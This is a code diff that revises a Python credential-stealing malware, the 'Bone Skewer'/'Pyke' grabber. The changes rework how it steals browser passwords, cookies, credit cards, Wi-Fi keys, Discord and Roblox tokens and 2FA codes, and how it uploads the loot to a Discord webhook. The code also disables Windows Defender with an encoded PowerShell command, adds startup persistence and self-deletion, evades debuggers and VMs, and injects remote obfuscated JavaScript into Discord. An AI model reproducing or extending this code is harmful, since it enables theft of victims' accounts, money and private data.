@@ -2,7 +2,6 @@ import base64
 import ctypes
 import json
 import os
-import platform
 import random
 import re
 import sqlite3
@@ -10,19 +9,15 @@ import subprocess
 import sys
 import threading
 import time
-import uuid
 import shutil
 from shutil import copy2
-from sys import argv
-from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
 
 import psutil
 import requests
-import wmi
 from Crypto.Cipher import AES
-from discord import Embed, File, SyncWebhook
 from PIL import ImageGrab
+from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
 __CONFIG__ = {
@@ -42,25 +37,28 @@ __CONFIG__ = {
     "wifi": False,
     "killprotector": False,
     "antidebug_vm": False,
-    "discord": False
+    "discord": False,
+    "anti_spam": False,
+    "self_destruct": False
 }
 
 #global variables
-tempfolder = mkdtemp()
-localappdata = os.getenv("localappdata")
 temp = os.getenv("temp")
+temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
+mk_temp = os.mkdir(temp_path)
+localappdata = os.getenv("localappdata")
 
 
 def main(webhook: str):
-
     checkforwebhook()
+
+    if __CONFIG__["anti_spam"]:
+        AntiSpam()
 
     if __CONFIG__["antidebug_vm"]:
         Debug()
 
-    webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, Startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
 
     for func in threads:
@@ -72,27 +70,38 @@ def main(webhook: str):
         except RuntimeError:
             continue
 
-    content = ""
+    zipup()
+
+    data = {
+        "username": "Pyke",
+        "avatar_url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png"
+    }
+
+    _file = f'{localappdata}\\Pyke-Logged-{os.getlogin()}.zip'
+
     if __CONFIG__["ping"]:
         if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
-            content += f"@{__CONFIG__['pingtype'].lower()}"
+            content = f"@{__CONFIG__['pingtype'].lower()}"
+            data.update({"content": content})
 
-    if not __CONFIG__["roblox"] and not __CONFIG__["browser"] and not __CONFIG__["wifi"] and not __CONFIG__["minecraft"] and not __CONFIG__["backupcodes"]:
-        webhook.send(content=content, avatar_url="https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png", username="Pyke")
+    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
+        with open(_file, 'rb') as file:
+            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': ('Pyke-Logged.zip', file, 'application/zip')})
+            requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
     else:
-        zipup()
-        _file = None
-        _file = File(f'{localappdata}\\Bone-Skewer-Logged-{os.getlogin()}.zip')
-        webhook.send(content=content, file=_file, avatar_url="https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png", username="Pyke")
+        requests.post(webhook, json=data)
+
+    if __CONFIG__["injection"]:
+        Injection()
 
     if __CONFIG__["systeminfo"]:
         PcInfo()
 
     if __CONFIG__["discord"]:
         Discord()
-
-    if __CONFIG__["injection"]:
-        Injection()
+        
+    if __CONFIG__["self_destruct"]:
+        self_destruct()
 
 def trygrab(func):
     def wrapper(*args, **kwargs):
@@ -112,6 +121,8 @@ def checkforwebhook():
 def configcheck(list):
     if not __CONFIG__["error"]:
         list.remove(fakeerror)
+    if not __CONFIG__["startup"]:
+        list.remove(startup)
     if not __CONFIG__["defender"]:
         list.remove(disable_defender)
     if not __CONFIG__["browser"]:
@@ -122,23 +133,37 @@ def configcheck(list):
         list.remove(Minecraft)
     if not __CONFIG__["backupcodes"]:
         list.remove(BackupCodes)
-    if not __CONFIG__["startup"]:
-        list.remove(Startup)
 
 
 def fakeerror():
     ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
-    
-    
+
+
+def startup():
+    startup_path = os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Start-up")
+    target_path = os.path.join(startup_path, os.path.basename(__file__))
+    if os.path.exists(target_path):
+        os.remove(target_path)
+    subprocess.run(["copy", __file__, startup_path], shell=True, check=True)
+
+
+def self_destruct():
+    os.remove(__file__)
+
+
 def disable_defender():
     cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
     subprocess.run(cmd, shell=True, capture_output=True)
 
 
-def create_temp(_dir: str or os.PathLike = gettempdir()):
+def create_temp(_dir: str or os.PathLike = None):
+    if _dir is None:
+        _dir = os.path.expanduser("~/tmp")
+    if not os.path.exists(_dir):
+        os.makedirs(_dir)
     file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
     path = os.path.join(_dir, file_name)
-    open(path, "x")
+    open(path, "x").close()
     return path
 
 
@@ -180,32 +205,59 @@ def killprotector():
             json.dump(item, f, indent=2, sort_keys=True)
 
 
+def zipup():
+    _zipfile = os.path.join(localappdata, f'Pyke-Logged-{os.getlogin()}.zip')
+    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
+    abs_src = os.path.abspath(temp_path)
+    for dirname, _, files in os.walk(temp_path):
+        for filename in files:
+            absname = os.path.abspath(os.path.join(dirname, filename))
+            arcname = absname[len(abs_src) + 1:]
+            zipped_file.write(absname, arcname)
+    zipped_file.close()
+
+
 class PcInfo:
     def __init__(self):
         self.get_inf(__CONFIG__["webhook"])
 
     def get_inf(self, webhook):
-        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-        embed = Embed(title="Bone Skewer Logger", color=2840158)
-
-        computer_os = platform.platform()
-        cpu = wmi.WMI().Win32_Processor()[0]
-        gpu = wmi.WMI().Win32_VideoController()[0]
-        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
+        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
+        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
+        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000))
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
         ip = requests.get('https://api.ipify.org').text
-        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        interface, addrs = next(iter(psutil.net_if_addrs().items()))
+        mac = addrs[0].address
 
-        embed.add_field(
-            name="System Info",
-            value=f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu.Name}`\n<:gpu:1051512654591688815> **GPU:** `{gpu.Name}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`''',
-            inline=False)
-        embed.set_thumbnail(url="https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png")
+        data = {
+            "embeds": [
+                {
+                    "title": "Pyke Logger",
+                    "color": 2840158,
+                    "fields": [
+                        {
+                             "name": "System Info",
+                             "value": f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu}`\n<:gpu:1051512654591688815> **GPU:** `{gpu}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`'''
+                        }
+                    ],
+                    "footer": {
+                        "text": "Bone Skewer Grabber | Created By Entity378"
+                    },
+                    "thumbnail": {
+                        "url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png"
+                    }
+                }
+            ],
+            "username": "Pyke",
+            "avatar_url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png"
+        }
 
-        webhook.send(embed=embed, avatar_url="https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png", username="Pyke")
+        requests.post(webhook, json=data)
 
 
 class Discord:
@@ -283,29 +335,7 @@ class Discord:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
-                                try:
-                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
-                                except ValueError:
-                                    pass
-                                try:
-                                    r = requests.get(self.baseurl, headers={
-                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                                        'Content-Type': 'application/json',
-                                        'Authorization': token})
-                                    if r.status_code == 200:
-                                        uid = r.json()['id']
-                                        if uid not in self.ids:
-                                            self.tokens.append(token)
-                                            self.ids.append(uid)
-                                except Exception:
-                                    pass
-
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in re.findall(self.regex, line):
-                            try:
+                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                 r = requests.get(self.baseurl, headers={
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
@@ -315,8 +345,21 @@ class Discord:
                                     if uid not in self.ids:
                                         self.tokens.append(token)
                                         self.ids.append(uid)
-                            except Exception:
-                                pass
+
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in re.findall(self.regex, line):
+                            r = requests.get(self.baseurl, headers={
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                'Content-Type': 'application/json',
+                                'Authorization': token})
+                            if r.status_code == 200:
+                                uid = r.json()['id']
+                                if uid not in self.ids:
+                                    self.tokens.append(token)
+                                    self.ids.append(uid)
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -325,18 +368,15 @@ class Discord:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
-                            try:
-                                r = requests.get(self.baseurl, headers={
-                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                                    'Content-Type': 'application/json',
-                                    'Authorization': token})
-                                if r.status_code == 200:
-                                    uid = r.json()['id']
-                                    if uid not in self.ids:
-                                        self.tokens.append(token)
-                                        self.ids.append(uid)
-                            except Exception:
-                                pass
+                            r = requests.get(self.baseurl, headers={
+                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                'Content-Type': 'application/json',
+                                'Authorization': token})
+                            if r.status_code == 200:
+                                uid = r.json()['id']
+                                if uid not in self.ids:
+                                    self.tokens.append(token)
+                                    self.ids.append(uid)
 
     def robloxinfo(self, webhook):
         if __CONFIG__["roblox"]:
@@ -344,25 +384,46 @@ class Discord:
                 if robo_cookie == "No Roblox Cookies Found":
                     pass
                 else:
-                    embed = Embed(title="Roblox Info", color=2840158)
                     headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
                     info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
 
-                    embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
-                    embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
-                    embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
-                    embed.set_thumbnail(url=info['ThumbnailUrl'])
-
-                    webhook.send(
-                        avatar_url="https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
-                        embed=embed,
-                        username="Pyke")
+                    data = {
+                        "embeds": [
+                            {
+                                "title": "Roblox Info",
+                                "color": 2840158,
+                                "fields": [
+                                    {
+                                        "name": "<:roblox_icon:1041819334969937931> Name:",
+                                        "value": f"`{info['UserName']}`",
+                                        "inline": True
+                                    },
+                                    {
+                                        "name": "<:robux_coin:1041813572407283842> Robux:",
+                                        "value": f"`{info['RobuxBalance']}`",
+                                        "inline": True
+                                    },
+                                    {
+                                        "name": "🍪 Cookie:",
+                                        "value": f"`{robo_cookie}`"
+                                    }
+                                ],
+                                "thumbnail": {
+                                    "url": info['ThumbnailUrl']
+                                },
+                                "footer": {
+                                    "text": "Bone Skewer Grabber | Created By Entity378"
+                                },
+                            }
+                        ],
+                        "username": "Pyke",
+                        "avatar_url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
+                    }
+                    requests.post(webhook, json=data)
             except Exception:
                 pass
 
     def upload(self, webhook):
-        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
-
         for token in self.tokens:
             if token in self.tokens_sent:
                 pass
@@ -370,15 +431,12 @@ class Discord:
             val_codes = []
             val = ""
             nitro = ""
-
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                        'Content-Type': 'application/json',
                        'Authorization': token}
-
             user = requests.get(self.baseurl, headers=headers).json()
             payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
             gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
-
             username = user['username'] + '#' + user['discriminator']
             discord_id = user['id']
             avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(
@@ -397,7 +455,6 @@ class Discord:
                 2: "Nitro",
                 3: "Nitro Basic"
             }
-
             nitro = premium_types.get(user['premium_type'], "❌")
 
             methods = "❌"
@@ -419,7 +476,7 @@ class Discord:
                     val_codes.append((code['code'], code['promotion']['outbound_title']))
 
             if not val_codes:
-                val += f'\n:gift: `No Gift Cards Found`\n'
+                val += "\n:gift: **No Gift Cards Found**\n"
             elif len(val_codes) >= 3:
                 num = 0
                 for c, t in val_codes:
@@ -431,14 +488,30 @@ class Discord:
                 for c, t in val_codes:
                     val += f'\n:gift: **{t}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-            embed = Embed(title=username, color=2840158)
-            embed.add_field(name="\u200b", value=val + "\u200b", inline=False)
-            embed.set_thumbnail(url=avatar)
+            data = {
+                "embeds": [
+                    {
+                        "title": f"{username}",
+                        "color": 2840158,
+                        "fields": [
+                            {
+                                "name": "\u200b",
+                                "value": val
+                            }
+                        ],
+                        "thumbnail": {
+                            "url": avatar
+                        },
+                        "footer": {
+                            "text": "Bone Skewer Grabber | Created By Entity378"
+                        },
+                    }
+                ],
+                "username": "Pyke",
+                "avatar_url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
+            }
 
-            webhook.send(
-                embed=embed,
-                avatar_url="https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
-                username="Pyke")
+            requests.post(webhook, json=data)
             self.tokens_sent += token
 
         image = ImageGrab.grab(
@@ -447,55 +520,25 @@ class Discord:
             include_layered_windows=False,
             xdisplay=None
         )
-        image.save(tempfolder + "\\image.png")
-
-        embed2 = Embed(title="Desktop Screenshot", color=2840158)
-        file = File(tempfolder + "\\image.png", filename="image.png")
-        embed2.set_image(url="attachment://image.png")
-
+        image.save(temp_path + "\\image.png")
+        file = temp_path + "\\image.png"
+        data1 = {
+            "embeds": [
+                {
+                    "title": "Desktop Screenshot",
+                    "color": 2840158,
+                    "image": {
+                        "url": "attachment://image.png"
+                    }
+                }
+            ],
+            "username": "Pyke",
+            "avatar_url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
+            "attachments": [file]
+        }
         self.robloxinfo(webhook)
+        requests.post(webhook, json=data1)
 
-        webhook.send(
-            embed=embed2,
-            avatar_url="https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/gui_images/avatar.png",
-            file=file,
-            username="Pyke")
-
-
-class Startup:
-    def __init__(self) -> None:        
-        self.working_dir = os.getenv("APPDATA") + "\\Windows-BSG"
-    
-        if self.check_self():
-            return
-
-        self.mkdir()
-        self.write_stub()
-        self.regedit()
-    
-    def check_self(self) -> bool:
-        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
-            return True
-
-        return False
-    
-    def mkdir(self) -> str:
-        if not os.path.isdir(self.working_dir):
-            os.mkdir(self.working_dir)
-        
-        else:
-            shutil.rmtree(self.working_dir)
-            os.mkdir(self.working_dir)
-    
-    def write_stub(self) -> None:
-        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
-        
-        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
-            f.write(f'@echo off\nif not DEFINED IS_HIDDEN set IS_HIDDEN=1 && powershell "start "%~dpnx0" -WindowStyle Hidden %*" && exit\ncall {self.working_dir}\\dat.txt')
-    
-    def regedit(self) -> None:
-        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows-BSG", "/f"], shell=True)
-        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows-BSG", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)
 
 @trygrab
 class Browsers:
@@ -532,8 +575,8 @@ class Browsers:
             'Profile 5',
         ]
 
-        os.makedirs(os.path.join(tempfolder, "Browser"), exist_ok=True)
-        os.makedirs(os.path.join(tempfolder, "Roblox"), exist_ok=True)
+        os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)
+        os.makedirs(os.path.join(temp_path, "Roblox"), exist_ok=True)
 
         for name, path in self.browsers.items():
             if not os.path.isdir(path):
@@ -588,7 +631,7 @@ class Browsers:
                 url = results[0]
                 login = results[1]
                 password = self.decrypt_password(results[2], self.masterkey)
-                with open(os.path.join(tempfolder, "Browser", "passwords.txt"), "a", encoding="utf-8") as f:
+                with open(os.path.join(temp_path, "Browser", "passwords.txt"), "a", encoding="utf-8") as f:
                     f.write(f"{url}:{login}:{password}\n")
 
     def cookies(self, name: str, path: str, profile: str):
@@ -602,7 +645,7 @@ class Browsers:
         copy2(path, cookievault)
         conn = sqlite3.connect(cookievault)
         cursor = conn.cursor()
-        with open(os.path.join(tempfolder, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
+        with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
@@ -621,7 +664,7 @@ class Browsers:
             return
         conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        with open(os.path.join(tempfolder, "Browser", "history.txt"), 'a', encoding="utf-8") as f:
+        with open(os.path.join(temp_path, "Browser", "history.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                 url, title, visit_count, last_visit_time = res
                 f.write(f"{url}\t{title}\t{visit_count}\t{last_visit_time}\n")
@@ -637,7 +680,7 @@ class Browsers:
             return
         conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        with open(os.path.join(tempfolder, "Browser", "cc's.txt"), 'a', encoding="utf-8") as f:
+        with open(os.path.join(temp_path, "Browser", "cc's.txt"), 'a', encoding="utf-8") as f:
             for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards").fetchall():
                 name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified = res
                 card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
@@ -652,8 +695,8 @@ class Browsers:
             pass
         else:
             robo_cookie = ""
-            with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
-                with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
+            with open(os.path.join(temp_path, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
+                with open(os.path.join(temp_path, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
                     try:
                         for line in f2:
                             if ".ROBLOSECURITY" in line:
@@ -671,14 +714,14 @@ class Wifi:
         self.wifi_list = []
         self.name_pass = {}
 
-        os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)
+        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
 
         data = subprocess.getoutput('netsh wlan show profiles').split('\n')
         for line in data:
             if 'All User Profile' in line:
                 self.wifi_list.append(line.split(":")[-1][1:])
             else:
-                with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
+                with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
                     f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                 f.close()
 
@@ -695,7 +738,7 @@ class Wifi:
                 key = ""
                 self.name_pass[i] = key
 
-        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
+        with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
             for i, j in self.name_pass.items():
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
@@ -709,12 +752,12 @@ class Minecraft:
         self.usercache_path = "\\.minecraft\\usercache.json"
         self.error_message = "No minecraft accounts or access tokens :("
 
-        os.makedirs(os.path.join(tempfolder, "Minecraft"), exist_ok=True)
+        os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
         self.session_info()
         self.user_cache()
 
     def session_info(self):
-        with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
+        with open(os.path.join(temp_path, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
             if os.path.exists(self.roaming + self.accounts_path):
                 with open(self.roaming + self.accounts_path, "r") as g:
                     self.session = json.load(g)
@@ -724,7 +767,7 @@ class Minecraft:
         f.close()
 
     def user_cache(self):
-        with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
+        with open(os.path.join(temp_path, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
             if os.path.exists(self.roaming + self.usercache_path):
                 with open(self.roaming + self.usercache_path, "r") as g:
                     self.user = json.load(g)
@@ -740,11 +783,11 @@ class BackupCodes:
         self.path = os.environ["HOMEPATH"]
         self.code_path = '\\Downloads\\discord_backup_codes.txt'
 
-        os.makedirs(os.path.join(tempfolder, "Discord"), exist_ok=True)
+        os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
         self.get_codes()
 
     def get_codes(self):
-        with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
+        with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
             if os.path.exists(self.path + self.code_path):
                 with open(self.path + self.code_path, 'r') as g:
                     for line in g.readlines():
@@ -755,20 +798,32 @@ class BackupCodes:
         f.close()
 
 
-def zipup():
-    _zipfile = os.path.join(localappdata, f'Bone-Skewer-Logged-{os.getlogin()}.zip')
-    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
-    abs_src = os.path.abspath(tempfolder)
-    for dirname, _, files in os.walk(tempfolder):
-        for filename in files:
-            absname = os.path.abspath(os.path.join(dirname, filename))
-            arcname = absname[len(abs_src) + 1:]
-            zipped_file.write(absname, arcname)
-    zipped_file.close()
+class AntiSpam:
+    def __init__(self):
+        if self.check_time():
+            sys.exit(0)
+
+    def check_time(self) -> bool:
+        current_time = time.time()
+        try:
+            with open(f"{temp}\\dd_setup.txt", "r") as f:
+                code = f.read()
+                if code != "":
+                    old_time = float(code)
+                    if current_time - old_time > 60:
+                        with open(f"{temp}\\dd_setup.txt", "w") as f:
+                            f.write(str(current_time))
+                        return False
+                    else:
+                        return True
+        except FileNotFoundError:
+            with open(f"{temp}\\dd_setup.txt", "w") as g:
+                g.write(str(current_time))
+            return False
 
 
 class Injection:
-    def __init__(self):
+    def __init__(self) -> None:
         webhook = __CONFIG__["webhook"]
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
@@ -777,7 +832,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get("https://raw.githubusercontent.com/Entity378/Discord-Injection/main/obfuscated.js").text
+        self.code = requests.get('https://raw.githubusercontent.com/Entity378/Discord-Injection/main/obfuscated.js').text
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
@@ -788,7 +843,7 @@ class Injection:
                     f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                     self.start_discord(dir)
 
-    def get_core(self, dir: str):
+    def get_core(self, dir: str) -> tuple:
         for file in os.listdir(dir):
             if re.search(r'app-+?', file):
                 modules = dir + '\\' + file + '\\modules'
@@ -801,7 +856,7 @@ class Injection:
                             continue
                         return core, file
 
-    def start_discord(self, dir: str):
+    def start_discord(self, dir: str) -> None:
         update = dir + '\\Update.exe'
         executable = dir.split('\\')[-1] + '.exe'
 
@@ -812,12 +867,8 @@ class Injection:
                     for file in os.listdir(app):
                         if file == executable:
                             executable = app + '\\' + executable
-                            subprocess.call([update,
-                                             '--processStart',
-                                             executable],
-                                            shell=True,
-                                            stdout=subprocess.PIPE,
-                                            stderr=subprocess.PIPE)
+                            subprocess.call([update, '--processStart', executable],
+                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 class Debug:
@@ -903,14 +954,12 @@ class Debug:
         self.blacklistedProcesses = [
             "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
             "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
-            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", argv[0]]
+            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
 
         self.check_process()
         if self.get_network():
             debugging = True
         if self.get_system():
-            debugging = True
-        if self.check_time():
             debugging = True
         return debugging
 
@@ -926,7 +975,8 @@ class Debug:
 
     def get_network(self) -> bool:
         ip = requests.get('https://api.ipify.org').text
-        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        interface, addrs = next(iter(psutil.net_if_addrs().items()))
+        mac = addrs[0].address
 
         if ip in self.blackListedIPS:
             return True
@@ -946,26 +996,8 @@ class Debug:
         if hostname in self.blackListedPCNames:
             return True
 
-    def check_time(self) -> bool:
-        current_time = time.time()
-        try:
-            with open(f"{temp}\\dd_setup.txt", "r") as f:
-                code = f.read()
-                if code != "":
-                    old_time = float(code)
-                    if current_time - old_time > 60:
